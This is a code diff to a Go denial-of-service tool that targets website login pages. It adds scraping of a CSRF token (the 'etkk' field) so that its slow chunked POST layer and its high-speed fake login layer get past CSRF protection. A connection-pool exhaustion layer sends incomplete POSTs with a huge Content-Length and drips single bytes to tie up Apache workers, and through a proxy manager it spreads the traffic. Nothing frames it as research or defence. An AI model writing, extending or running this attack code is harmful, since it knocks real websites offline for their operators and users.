@@ -7,12 +7,36 @@ import (
 	"math/rand"
 	"net"
 	"net/http"
+	"regexp"
 	"strings"
 	"time"
 )
 
+// CSRF token regex pattern for 'etkk' field
+var csrfTokenRegex = regexp.MustCompile(`name=['"]etkk['"]\s+value=['"]([^'"]+)['"]`)
+
+// fetchCSRFToken fetches the login page and extracts the CSRF token.
+func fetchCSRFToken(client *http.Client, loginURL string) (string, error) {
+	resp, err := client.Get(loginURL)
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return "", err
+	}
+
+	matches := csrfTokenRegex.FindStringSubmatch(string(body))
+	if len(matches) < 2 {
+		return "", fmt.Errorf("CSRF token 'etkk' not found on login page")
+	}
+	return matches[1], nil
+}
+
 // ============================================================
-// LAYER 1: SLOW CHUNKED POST
+// LAYER 1: CSRF-AWARE SLOW CHUNKED POST
 // ============================================================
 func layer1Chunked(ctx context.Context, o *Orchestrator, workerID int) error {
 	client := o.proxyMgr.NewClient()
@@ -20,6 +44,8 @@ func layer1Chunked(ctx context.Context, o *Orchestrator, workerID int) error {
 
 	targetURL := o.smartPaths.LoginPOST
 	refererURL := o.smartPaths.LoginGET
+	loginURL := o.smartPaths.LoginGET
+	csrfEnabled := o.smartPaths.CSRFEnabled
 	layerIdx := 0
 
 	for {
@@ -29,7 +55,21 @@ func layer1Chunked(ctx context.Context, o *Orchestrator, workerID int) error {
 		default:
 		}
 
-		body := slowLoginBody()
+		// Fetch CSRF token if enabled
+		var csrfToken string
+		if csrfEnabled {
+			token, err := fetchCSRFToken(client, loginURL)
+			if err != nil {
+				o.stats.FailedRequests.Add(1)
+				o.stats.Layers[layerIdx].Fail.Add(1)
+				time.Sleep(time.Duration(rand.Intn(200)+100) * time.Millisecond)
+				continue
+			}
+			csrfToken = token
+		}
+
+		// Build body with CSRF token
+		body := slowLoginBodyWithCSRF(csrfToken)
 
 		req, err := http.NewRequestWithContext(ctx, "POST", targetURL, body)
 		if err != nil {
@@ -63,14 +103,20 @@ func layer1Chunked(ctx context.Context, o *Orchestrator, workerID int) error {
 	}
 }
 
-func slowLoginBody() io.Reader {
+func slowLoginBodyWithCSRF(csrfToken string) io.Reader {
 	r, w := io.Pipe()
 	go func() {
 		defer w.Close()
-		w.Write([]byte("username=" + strings.Repeat("A", 512)))
-		time.Sleep(time.Duration(rand.Intn(500)+100) * time.Millisecond)
+		if csrfToken != "" {
+			w.Write([]byte("etkk=" + csrfToken))
+			time.Sleep(time.Duration(rand.Intn(300)+100) * time.Millisecond)
+			w.Write([]byte("&username=" + strings.Repeat("A", 512)))
+		} else {
+			w.Write([]byte("username=" + strings.Repeat("A", 512)))
+		}
+		time.Sleep(time.Duration(rand.Intn(500)+200) * time.Millisecond)
 		w.Write([]byte("&password=" + strings.Repeat("B", 512)))
-		time.Sleep(time.Duration(rand.Intn(500)+100) * time.Millisecond)
+		time.Sleep(time.Duration(rand.Intn(500)+200) * time.Millisecond)
 		w.Write([]byte(fmt.Sprintf("&capt=%d", rand.Intn(20)+1)))
 		for i := 0; i < 5; i++ {
 			time.Sleep(time.Duration(rand.Intn(200)+50) * time.Millisecond)
@@ -129,12 +175,14 @@ func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
 }
 
 // ============================================================
-// LAYER 3: FAKE LOGIN POST (HIGH SPEED)
+// LAYER 3: CSRF-AWARE FAKE LOGIN POST (HIGH SPEED)
 // ============================================================
 func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error {
 	client := o.proxyMgr.NewClientWithTimeout(15 * time.Second)
 	targetURL := o.smartPaths.LoginPOST
 	refererURL := o.smartPaths.LoginGET
+	loginURL := o.smartPaths.LoginGET
+	csrfEnabled := o.smartPaths.CSRFEnabled
 	layerIdx := 2
 
 	for {
@@ -144,10 +192,32 @@ func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error
 		default:
 		}
 
-		body := fmt.Sprintf("username=%s&password=%s&capt=%d",
-			randomString(8+rand.Intn(16)),
-			randomString(8+rand.Intn(16)),
-			rand.Intn(20)+1)
+		// Fetch CSRF token if enabled
+		var csrfToken string
+		if csrfEnabled {
+			token, err := fetchCSRFToken(client, loginURL)
+			if err != nil {
+				o.stats.FailedRequests.Add(1)
+				o.stats.Layers[layerIdx].Fail.Add(1)
+				continue
+			}
+			csrfToken = token
+		}
+
+		// Build body with CSRF token
+		var body string
+		if csrfToken != "" {
+			body = fmt.Sprintf("etkk=%s&username=%s&password=%s&capt=%d",
+				csrfToken,
+				randomString(8+rand.Intn(16)),
+				randomString(8+rand.Intn(16)),
+				rand.Intn(20)+1)
+		} else {
+			body = fmt.Sprintf("username=%s&password=%s&capt=%d",
+				randomString(8+rand.Intn(16)),
+				randomString(8+rand.Intn(16)),
+				rand.Intn(20)+1)
+		}
 
 		req, err := http.NewRequestWithContext(ctx, "POST", targetURL, strings.NewReader(body))
 		if err != nil {
@@ -188,7 +258,6 @@ func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error
 func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error {
 	layerIdx := 3
 	host := o.target.Host
-	// Ensure host has port
 	if !strings.Contains(host, ":") {
 		if o.target.Scheme == "https" {
 			host += ":443"
@@ -206,7 +275,7 @@ func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error
 
 		conn, err := net.DialTimeout("tcp", host, 5*time.Second)
 		if err != nil {
-			continue // Immediately retry
+			continue
 		}
 
 		o.stats.TotalRequests.Add(1)
@@ -214,7 +283,6 @@ func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error
 		o.stats.SuccessRequests.Add(1)
 		o.stats.Layers[layerIdx].Success.Add(1)
 
-		// Send incomplete POST request — Apache waits for Content-Length body
 		incompleteReq := fmt.Sprintf(
 			"POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 999999\r\nConnection: keep-alive\r\n\r\n",
 			o.smartPaths.LoginPOST, o.target.Host,
@@ -223,7 +291,6 @@ func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error
 		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
 		conn.Write([]byte(incompleteReq))
 
-		// Hold connection for 30 seconds, drip data slowly
 		deadline := time.Now().Add(30 * time.Second)
 		for time.Now().Before(deadline) {
 			select {
@@ -232,7 +299,7 @@ func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error
 				return ctx.Err()
 			case <-time.After(time.Duration(rand.Intn(2000)+500) * time.Millisecond):
 				conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
-				conn.Write([]byte("x")) // Single byte to keep connection alive
+				conn.Write([]byte("x"))
 			}
 		}
 		conn.Close()
